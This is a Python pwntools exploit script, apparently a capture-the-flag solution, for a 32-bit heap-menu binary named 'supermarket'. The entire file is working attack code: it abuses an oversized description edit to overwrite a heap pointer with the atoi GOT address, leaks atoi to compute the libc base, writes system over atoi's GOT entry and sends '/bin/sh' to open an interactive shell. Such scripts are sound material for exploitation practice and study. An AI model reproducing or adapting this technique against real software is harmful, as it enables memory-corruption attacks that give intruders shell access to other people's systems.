from pwn import *
from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./supermarket"
libc_binary = "./libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

context.arch = "i386"

def add(idx,description_size,description):
    p.sendlineafter("your choice>> ","1")
    p.sendlineafter("name:",str(idx))
    p.sendlineafter("price:","10")
    p.sendlineafter("descrip_size:",str(description_size))
    p.sendlineafter("description:",description)

def delete(idx):
    p.sendlineafter("your choice>> ","2")
    p.sendlineafter("name:",str(idx))

def list_all():
    p.sendlineafter("your choice>> ","3")

def change_price(idx,rise_size):
    p.sendlineafter("your choice>> ","4")
    p.sendlineafter("name:",str(idx))
    p.sendlineafter("input the value you want to cut or rise in:",str(rise_size))

def change_description(idx,description_size,description):
    p.sendlineafter("your choice>> ","5")
    p.sendlineafter("name:",str(idx))
    p.sendlineafter("descrip_size:",str(description_size)) #0-256
    p.sendlineafter("description:",description)

def quit():
    p.sendlineafter("your choice>> ","6")

atoi_got = elf.got["atoi"]

# add => malloc(0x1c) && malloc(descrip_size)

add(0,0x80,"a"*0x10)
add(1,0x20,"b"*0x20)
change_description(0,0x90,"")
add(2,0x20,"d"*0x10)

payload = "2".ljust(16,"\x00") + p32(20) + p32(0x20) + p32(atoi_got)
change_description(0,0x80,payload)
list_all()
p.recvuntil('2: price.20, des.')
atoi_addr = u32(p.recvuntil('\n').split('\n')[0].ljust(4,'\x00'))
# gdb.attach(p)
log.success("atoi_addr:" + hex(atoi_addr))

# libc = LibcSearcher('atoi',atoi_addr)  
libc_base = atoi_addr - libc.sym['atoi']  
system_addr = libc_base + libc.sym['system']

change_description(2,0x20,p32(system_addr))
p.sendlineafter('your choice>>','/bin/sh')

p.interactive()
